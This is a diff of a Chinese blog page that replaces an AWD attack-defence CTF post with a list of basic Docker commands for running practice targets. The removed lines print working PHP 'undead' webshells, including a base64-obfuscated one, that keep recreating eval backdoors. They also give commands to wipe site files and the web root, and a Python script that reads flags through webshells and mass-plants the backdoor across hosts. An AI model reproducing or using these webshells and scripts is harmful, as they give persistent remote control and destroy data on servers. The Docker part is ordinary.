@@ -3,34 +3,31 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>AWD - MINX&#39;s Blog</title>
+  <title>Docker常用命令 - MINX&#39;s Blog</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png">
-  <meta name="description" content="AWD简介AWD攻防战,出题方会给每个队伍部署同样环境的主机，每个队伍的主机里都有flag，攻击别人的靶机以取得别人的flag提交来得分，本机的flag被别人提交会被扣分。因此要在攻击别人的机器的同时要防御好自己的机器避免被别人攻破。也就是真正的攻防实战.">
+  <meta name="description" content="Docker部署靶场常用命令">
 <meta property="og:type" content="article">
-<meta property="og:title" content="AWD">
-<meta property="og:url" content="http://iminx.cn/2019/09/10/AWD/index.html">
+<meta property="og:title" content="Docker常用命令">
+<meta property="og:url" content="http://iminx.cn/2019/10/22/Docker常用命令/index.html">
 <meta property="og:site_name" content="MINX&#39;s Blog">
-<meta property="og:description" content="AWD简介AWD攻防战,出题方会给每个队伍部署同样环境的主机，每个队伍的主机里都有flag，攻击别人的靶机以取得别人的flag提交来得分，本机的flag被别人提交会被扣分。因此要在攻击别人的机器的同时要防御好自己的机器避免被别人攻破。也就是真正的攻防实战.">
+<meta property="og:description" content="Docker部署靶场常用命令">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/09/06/lEocGHKeD4CkIvB.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/06/CvQ3q7xn49TYf8A.png">
-<meta property="og:updated_time" content="2019-10-10T16:06:51.672Z">
+<meta property="og:updated_time" content="2019-10-29T13:00:17.416Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="AWD">
-<meta name="twitter:description" content="AWD简介AWD攻防战,出题方会给每个队伍部署同样环境的主机，每个队伍的主机里都有flag，攻击别人的靶机以取得别人的flag提交来得分，本机的flag被别人提交会被扣分。因此要在攻击别人的机器的同时要防御好自己的机器避免被别人攻破。也就是真正的攻防实战.">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/06/lEocGHKeD4CkIvB.png">
+<meta name="twitter:title" content="Docker常用命令">
+<meta name="twitter:description" content="Docker部署靶场常用命令">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1572354046546">
+  <link rel="stylesheet" href="/css/style.css?v=1572354046531">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -144,86 +141,47 @@
         
         <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/1.jpg">
         
-        <h1>AWD</h1>
+        <h1>Docker常用命令</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月10日</a>
-    <a><i class="nexmoefont icon-areachart"></i>561 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 2 分钟</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月22日</a>
+    <a><i class="nexmoefont icon-areachart"></i>205 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
     
-      <a class="nexmoefont icon-appstore-fill -link" href="/categories/AWD/">AWD</a>
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/Docker/">Docker</a>
     
     
   </div>
   <article>
-    <h3 id="AWD简介"><a href="#AWD简介" class="headerlink" title="AWD简介"></a>AWD简介</h3><p>AWD攻防战,出题方会给每个队伍部署同样环境的主机，每个队伍的主机里都有flag，攻击别人的靶机以取得别人的flag提交来得分，本机的flag被别人提交会被扣分。因此要在攻击别人的机器的同时要防御好自己的机器避免被别人攻破。也就是真正的攻防实战.</p>
+    <p>Docker部署靶场常用命令</p>
 <a id="more"></a>
-<h3 id="环境配置（挂代理"><a href="#环境配置（挂代理" class="headerlink" title="环境配置（挂代理"></a>环境配置（挂代理</h3><p>根据所给的数据配置一下代理：<br><img src="https://i.loli.net/2019/09/06/lEocGHKeD4CkIvB.png" alt="1XMF___8PIZU5_WP__V_1QH.png"></p>
-<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><ol>
-<li>ssh连接一下自己的服务器</li>
+<h1 id="Docker基础命令"><a href="#Docker基础命令" class="headerlink" title="Docker基础命令"></a>Docker基础命令</h1><ol>
+<li>Docker启动：<code>systemctl start docker</code></li>
+<li>守护进程重启:<code>sudo systemctl daemon-reload</code></li>
+<li>重启docker服务:<code>systemctl restart  docker</code></li>
+<li>重启docker服务:<code>sudo service docker restart</code></li>
+<li>关闭docker:<code>service docker stop</code>  </li>
+<li>关闭docker:<code>systemctl stop docker</code><h1 id="容器相关命令"><a href="#容器相关命令" class="headerlink" title="容器相关命令"></a>容器相关命令</h1></li>
+<li>搜索镜像：<code>docker search sqli-labs</code></li>
+<li>下载所需镜像：<code>docker pull acgpiano/sqli-labs</code></li>
+<li>运行相关镜像(例)：<code>docker run -dt --name sqli-labs -p 8080:80 --rm  acgpiano/sqli-labs</code></li>
+<li>查看有哪些镜像:<code>docker images</code></li>
+<li>查看正在运行的容器：<code>docker ps</code></li>
+<li>进入相关容器：<code>docker exec -it ID /bin/bash</code></li>
+<li>启动一个或多少已经被停止的容器:<code>docker start ID</code></li>
+<li>停止一个运行中的容器:<code>docker stop ID</code></li>
+<li>重启容器：<code>docker restart ID</code></li>
+<li>删除容器：<code>docker rm ID</code></li>
+<li>删除镜像：<code>docker rmi IMAGE</code></li>
 </ol>
-<ol start="2">
-<li><p>然后大概走一遍备份之类的流程</p>
-</li>
-<li><p>开始代码审计，挖洞。一顿操作猛如虎拿到了webshell之后嘞，就是要维持权限，也就是通过所拿到的后门上传一个不死马或者反弹shell</p>
-<h5 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h5><p>不死马，顾名思义就是在执行后会不断生成一个shell文件来维持权限的存在<br>先放一个网上流行的不死马</p>
-<pre><code>&lt;?php 
-ignore_user_abort(true);
-set_time_limit(0);
-unlink(__FILE__);
-$file = &#39;2.php&#39;;
-$code = &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;){@eval($_POST[a]);} ?&gt;&#39;;
-while (1){
- file_put_contents($file,$code);
- system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .2.php&#39;);
- usleep(5000);
-} 
-?&gt;</code></pre><p>以及一个升级版不死马</p>
-<pre><code>&lt;?php
-ignore_user_abort(true);
-set_time_limit(0);
-$file = &#39;c.php&#39;;
-$code = base64_decode(&#39;PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+&#39;);
-while(true) {
-  if(md5(file_get_contents($file))===md5($code)) {
-      file_put_contents($file, $code);
-  }
-  usleep(50);
-}
-?&gt;</code></pre></li>
-</ol>
-<h5 id="上传不死马"><a href="#上传不死马" class="headerlink" title="上传不死马"></a>上传不死马</h5><p>利用一下刚刚的webshell将不死马上传至服务器并访问一下让它跑起来<br>这边是直接使用hackbar将不死马上传<br><img src="https://i.loli.net/2019/09/06/CvQ3q7xn49TYf8A.png" alt="MEI67__FE4JMG3LUDYX6PEH.png"></p>
-<h5 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h5><p>刚刚拿到的webshell可以拿来上传不死马也可以拿来做其他的操作，例如删除网站或者删除一下文件</p>
-<h6 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h6><p>使用global语法删除文件<br><code>array_map(&#39;unlink&#39;, glob(&#39;*&#39;));</code></p>
-<h6 id="删除网站"><a href="#删除网站" class="headerlink" title="删除网站"></a>删除网站</h6><p>使用system调用系统命令<br><code>system（&#39;cd ../../../ &amp;&amp; rm -rf /web&#39;）</code></p>
-<h5 id="批量化脚本"><a href="#批量化脚本" class="headerlink" title="批量化脚本"></a>批量化脚本</h5><pre><code>import requests
-url = &quot;http://192.168.238.132:880&quot;
-shell = &quot;/shell.php&quot;
-passwd = &quot;aaa&quot;
-port = &quot;&quot;
-payload = {passwd: &#39;system(\&#39;cat /flag\&#39;);&#39;}
-payload2 = {shell: &#39;ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = &#39;2.php&#39;;$code = &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;){@eval($_POST[a]);} ?&gt;&#39;;while (1){file_put_contents($file,$code);usleep(5000);}&#39;}
-for i in range(1,6):
-    url1 = url+str(i)+shell
-    try:
-        r=requests.post(url1,payload,timeout=1)
-        if(r.status_code==requests.codes.ok):
-            print(url1+&quot; flag is :&quot;+r.text)
-        else:
-            print(&quot;web connect failed&quot;)
-    except:
-        print(&quot;shell connect failed&quot;)
-    try:
-        r=requests.post(url1,payload2,timeout=1)
-    except:
-        print(&quot;shell insert failed&quot;)</code></pre>
+
   </article>
   
     
 <div class="nexmoe-post-copyright">
 <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
 <strong>本文作者：</strong>MINX<br>
-<strong>本文链接：</strong><a href="http://iminx.cn/2019/09/10/AWD/" title="http://iminx.cn/2019/09/10/AWD/" target="_blank" rel="noopener">http://iminx.cn/2019/09/10/AWD/</a><br>
+<strong>本文链接：</strong><a href="http://iminx.cn/2019/10/22/Docker常用命令/" title="http://iminx.cn/2019/10/22/Docker常用命令/" target="_blank" rel="noopener">http://iminx.cn/2019/10/22/Docker常用命令/</a><br>
 
   <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可 <br> <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
 
